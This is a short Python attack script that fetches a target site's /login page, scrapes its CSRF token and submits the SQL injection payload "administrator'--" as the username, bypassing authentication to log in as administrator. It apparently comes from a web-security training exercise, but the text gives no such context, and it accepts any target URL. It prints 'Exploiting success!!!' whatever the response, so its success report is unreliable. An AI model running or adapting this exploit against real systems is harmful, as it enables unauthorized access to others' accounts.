import requests
import argparse
from urllib.parse import urlparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the target's URL (e: https://example.com)")
args = parser.parse_args()
input_url = args.url

def exploit(url):
    url_parsed = urlparse(url)
    full_url = f"{url_parsed.scheme}://{url_parsed.netloc}"

    endpoint = "/login"
    exploit_url = f"{full_url}{endpoint}"

    session = requests.Session()
    initial_response = session.get(exploit_url)

    soup = BeautifulSoup(initial_response.text, 'html.parser')
    form = soup.find('input')
    csrf_token = form.get('value')

    payload = "administrator'--"
    data = {
    'csrf': csrf_token,
    'username': payload,
    'password': "anything"
    }

    response = session.request("POST", exploit_url, data=data)
    return response

exploit = exploit(input_url)
url_endpoint = exploit.url
status_code = exploit.status_code

print("Exploiting target...")
print("-"*50)
print(f"URL Endpoint: {url_endpoint}")
print(f"Status Code: {status_code}")
print("-"*50)
print("Exploiting success!!!")